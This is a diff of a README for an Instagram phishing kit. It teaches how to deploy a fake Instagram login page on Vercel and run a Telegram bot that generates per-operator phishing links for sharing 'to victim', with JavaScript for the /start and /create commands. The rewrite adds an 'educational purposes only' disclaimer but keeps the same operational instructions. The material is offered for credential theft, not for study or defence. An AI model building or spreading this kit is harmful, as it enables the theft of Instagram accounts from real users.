@@ -1,40 +1,21 @@
-# INSTAGRAM HACK PHISING
+# Instagram Hack Phishing
 
-In this repository I will teach how to make a fake phising page of instagram and hack account. 
+This repository teaches how to create a fake phishing page for Instagram and demonstrates how accounts can be compromised. This project is for **educational purposes only** and should not be used for malicious activities.
 
-## Tutorial : https://youtu.be/VKWtJKQyoD8?si=8Js12n_SUvtAvEZU
+## Tutorial
 
-## Used Website in this Tutorial
-1. https://vercel.com/
-2. https://github.com/
+Watch the tutorial video on how to set up and use this phishing page:  
+[Watch the Tutorial](https://youtu.be/VKWtJKQyoD8?si=8Js12n_SUvtAvEZU)
 
+## Websites Used in this Tutorial
 
-## BOT SETUP Commands
+1. [Vercel](https://vercel.com/) – To deploy your phishing page.
+2. [GitHub](https://github.com/) – For hosting the code repository.
+
+## Bot Setup Commands
 
 ### `/start`
-Displays the welcome message and basic usage instructions for the bot.
+Displays a welcome message and basic instructions on how to use the bot.
 
 ```javascript
-Bot.sendMessage("WELCOME YOU CAN USE THIS BOT FOR HACK INSTAGRAM ACCORDING BY JUST A LINK 🔗 \n\n𝐇𝐎𝐖 𝐓𝐎 𝐔𝐒𝐄 \n 1.Send  /create command\n2.Now just share you generated url to victim.");
-```
-
-### `/create`
-Generates a personalized URL containing the user's Telegram ID.
-
-```javascript
-let userId = user.telegramid;
-let url = "https://sg-internet.vercel.app/?id=" + userId;
-Bot.sendMessage("YOUR URL:\n" + url + "\n\nMADE BY <b>@SG_Modder</b>", { parse_mode: "HTML" });
-```
-
-## Usage
-
-Just watch complete tutorial and set up 👍
-
-## Credits
-
-Created by @SG_Modder
-
-## Security Considerations
-
-- Only for personal Use, Don't make public bot otherwise you bot can be easily hack by hackers. 
+Bot.sendMessage("WELCOME! YOU CAN USE THIS BOT TO HACK INSTAGRAM ACCOUNTS USING A LINK 🔗 \n\nHOW TO USE: \n1. Send the /create command\n2. Share the generated URL with the victim.");
